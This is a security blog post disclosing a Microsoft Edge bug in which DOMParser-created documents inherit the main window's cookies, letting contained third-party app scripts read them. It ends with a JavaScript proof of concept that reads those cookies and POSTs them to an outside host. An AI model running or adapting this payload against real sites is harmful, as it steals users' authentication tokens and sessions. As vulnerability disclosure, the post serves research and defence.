---
layout: post
title: Microsoft Edge Cookie Bypass
---

<img src="{{ site.baseurl }}/assets/2018-7-24/edge.jpg" alt="edge"/>

### Overview
Recently I stumbled across a security vulnerability in Microsoft Edge browser caused by an improper implementation of the official DOM specifications. This implementation issue was caused by an incorrectly defined inheritance chain between the main window document and HTMLDocument type objects created by the DOMParser API.

### Technical Background
After reading through dozens of commits from several Chrome and FireFox members on the Whatwg GitHub repositories, I have come to the conclusion that the official spec for document has been in flux for the past few years and Microsoft has struggled to keep up with the changes. 

Before diving into the exploit, here is a quick overview of how the DOM's implementation of document SHOULD work:

"document" has migrated from a class to an abstract interface, and should not be instantiated directly. There is still a constructor for creating document objects from the document in some browsers, but it is now deprecated. 

Rather than creating "document" objects, document is now an interface defining how document-style objects should appear and behave. All instantiated document objects should be from the classes XMLDocument or HTMLDocument. Both of whom look very similar except for a few properties and different algorithms under the hood. In a prior world another document class called SVGDocument existed, but SVG document has been merged with XMLDocument as SVG is a subset of XML and maintaining one XML document class is much easier since XML presents a large security risk as-is. The main window document in all browsers is now an HTMLDocument by the way. Safari still seems to have a global called SVGDocument but further analysis shows it is simply an alias for XMLDocument.

As document is now an abstract interface, XMLDocument and HTMLdocument must inherit their properties and methods from document. The state should NOT be inherited however. 

### Exploit
A little-known browser API, DOMParser() allows the creation of document objects when provided a string and mime-type as the input.

DOMParser() documentation is shaky, with MDN having a version about two years old from what I can see from Git commits. It's generally a lesser-used API, and it's really a big security risk with similar exploits to Blob() due to it's reliance on raw input data.

Providing the DOMParser() with an HTML type input produces a document of type HTMLDocument. This document is independent of the main window document, and should not inherit any properties from the main window document. 

However, in Microsoft Edge - main window document cookies are inherited. I've attempted to reproduce on Chrome and FireFox as well. Chrome fixed the issue before I even found it, and it seems to have never existed in FireFox. 

This is important, because it can be used as a bypass on almost any web-based app store. For example, the Slack app exchange attempts to containerize JavaScript from third-party developers in your Slack instance so that it cannot leach information from your conversations and send it back to it's own servers. With this bypass, any information stored in the main window cookies is accessable to a third party script even though the addon-app has been contained and does not have direct access to the main window cookies. 

I have tried this on a number of web based app-exchanges and sites that allow custom HTML/CSS/JS customization and all have been successful at accessing the cookies on Edge - often taking the authentication tokens with it.

Here is a proof of concept exploit:

```javascript
var parser = new DOMParser();
var html = parser.parseFromString('', 'text/html');
var cookies = html.cookie;
var http = new XMLHttpRequest();
var url = 'http://www.save-the-cookies.com';
var params = `cookies=${JSON.stringify(cookies)}`;
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
        alert('I stole your cookies!');
    }
}
http.send(params);
```